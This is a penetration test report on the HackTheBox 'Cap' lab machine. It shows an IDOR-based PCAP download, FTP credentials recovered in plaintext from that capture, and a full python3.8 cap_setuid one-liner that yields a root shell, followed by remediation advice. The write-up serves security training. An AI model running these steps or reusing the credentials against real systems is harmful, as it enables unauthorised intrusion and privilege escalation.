# Technical Penetration Test Report

**Target:** 10.129.13.171 (HackTheBox — Cap)
**OS:** Ubuntu Linux (OpenSSH 8.2p1 Ubuntu 4ubuntu0.2)
**Assessment Date:** June 2026
**Tester:** Shemmy Afolayan
**Classification:** CONFIDENTIAL — TECHNICAL

---

## Scope & Methodology

**Scope:** Single host — 10.129.13.171
**Methodology:** Black-box external penetration test
**Framework:** PTES (Penetration Testing Execution Standard)
**Phases:** Reconnaissance → Enumeration → Exploitation → Post-Exploitation

---

## 1. Reconnaissance & Enumeration

### 1.1 Port Scan

**Tool:** Nmap 7.93
**Command:**
```bash
nmap -sC -sV -oN nmap_initial.txt 10.129.13.171
```

**Results:**

| Port | State | Service | Version |
|---|---|---|---|
| 21/tcp | Open | FTP | vsftpd 3.0.3 |
| 22/tcp | Open | SSH | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | Open | HTTP | Gunicorn (Python WSGI) |

**OS Detection:** Linux/Ubuntu (via SSH banner)

### 1.2 FTP Enumeration

Anonymous login attempt returned `530 Login incorrect` — anonymous FTP disabled. No known CVEs for vsftpd 3.0.3.

### 1.3 Web Application Enumeration

**HTTP Title:** Security Dashboard
**Server:** Gunicorn (Python WSGI server — indicates Flask or Django backend)

**Directory brute force:**
```bash
gobuster dir -u http://10.129.13.171 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,py,html,txt -o gobuster.txt
```

**Discovered endpoints:**

| Endpoint | Status | Notes |
|---|---|---|
| `/` | 200 | Dashboard — authenticated as "Nathan" |
| `/ip` | 200 | Executes `ifconfig` — displays network interface data |
| `/data` | 302 | Redirects to `/` |
| `/data/{id}` | 200 | Returns PCAP metadata + download — **IDOR present** |

---

## 2. Vulnerability Findings

---

### FINDING-01 — Insecure Direct Object Reference (IDOR)

**Severity:** High
**CVSS v3.1 Score:** 7.5
**CVSS Vector:** AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

**Description:**
The `/data/{id}` endpoint accepts a user-supplied integer to retrieve network packet captures. No server-side authorisation check validates whether the requesting user owns the requested resource. By iterating the ID parameter, an authenticated user can access packet captures belonging to other users.

**Proof of Concept:**
```
GET /data/0 HTTP/1.1
Host: 10.129.13.171
```
Response: PCAP metadata for a capture not belonging to the authenticated user, plus a functional download link.

**Evidence:**
- `/data/0` returned 72 packets, 69 TCP — a capture belonging to a different user session
- Full download available via the "Download" button on the page
- No 403 or redirect — server treats the request as authorised

**Impact:**
Full read access to network captures belonging to any user on the platform. Since captures may contain authentication traffic, this directly enables credential harvesting.

---

### FINDING-02 — Plaintext FTP Credential Transmission

**Severity:** High
**CVSS v3.1 Score:** 7.5
**CVSS Vector:** AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N

**Description:**
FTP (port 21) transmits authentication credentials in cleartext. The PCAP obtained via FINDING-01 contained an FTP session in which the username and password were visible in plaintext within the packet data.

**Proof of Concept:**
Wireshark filter applied to `0.pcap`:
```
ftp
```

Packets revealed:
```
Request:  USER nathan
Response: 331 Please specify the password.
Request:  PASS Buck3tH4TF0RM3!
Response: 230 Login successful.
```

**Tool:** Wireshark 4.x — standard network protocol analyser
**Relevant Packets:** FTP stream within `0.pcap` downloaded from `/data/0`

**Impact:**
Valid system credentials recovered in plaintext. Credential `nathan:Buck3tH4TF0RM3!` confirmed valid for SSH access (see FINDING chain below).

---

### FINDING-03 — Linux Capability Misconfiguration (cap_setuid)

**Severity:** High
**CVSS v3.1 Score:** 7.8
**CVSS Vector:** AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**Description:**
The Python 3.8 binary has the `cap_setuid` Linux capability assigned. This capability allows a process to set its UID to any value, including 0 (root), without requiring SUID bit or sudo. An authenticated low-privilege user can exploit this to escalate to root.

**Discovery Command:**
```bash
getcap -r / 2>/dev/null
```

**Output:**
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
```

**Exploitation:**
```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Result:** Root shell obtained. `id` returned `uid=0(root) gid=1000(nathan)`.

**Impact:**
Full privilege escalation to root. All files, configurations, and credentials on the system accessible. Lateral movement to connected systems possible.

---

## 3. Attack Chain Summary

```
[Attacker] 
    │
    ▼
Nmap scan → port 80 open (HTTP/Gunicorn)
    │
    ▼
Web dashboard → IDOR on /data/0
    │
    ▼
Download 0.pcap → Wireshark analysis
    │
    ▼
FTP plaintext creds: nathan:Buck3tH4TF0RM3!
    │
    ▼
SSH login as nathan (port 22)
    │
    ▼
getcap → python3.8 has cap_setuid
    │
    ▼
python3.8 setuid(0) → root shell
    │
    ▼
[FULL SYSTEM COMPROMISE]
```

**Time to compromise:** ~45 minutes from initial scan to root shell.
**Skill level required:** Low–Medium. All techniques are well-documented and require no custom exploits.

---

## 4. Tools Used

| Tool | Purpose |
|---|---|
| Nmap 7.93 | Port scanning and service enumeration |
| Gobuster 3.8.2 | Web directory enumeration |
| Wireshark 4.x | PCAP analysis and credential extraction |
| sshpass | Automated SSH authentication |
| getcap | Linux capability enumeration |
| Python 3.8 | Privilege escalation vector |

---

## 5. Remediation Summary

| Finding | Remediation | Priority |
|---|---|---|
| FINDING-01 IDOR | Enforce server-side authorisation on `/data/{id}` | Critical |
| FINDING-02 FTP Plaintext | Disable FTP, implement SFTP/SCP | Critical |
| FINDING-03 cap_setuid | Remove cap_setuid from Python binary | Critical |

Full remediation detail in [Remediation Report](./3-remediation-report.md).

---

*Produced following PTES methodology. All testing was performed in an authorised lab environment (HackTheBox).*
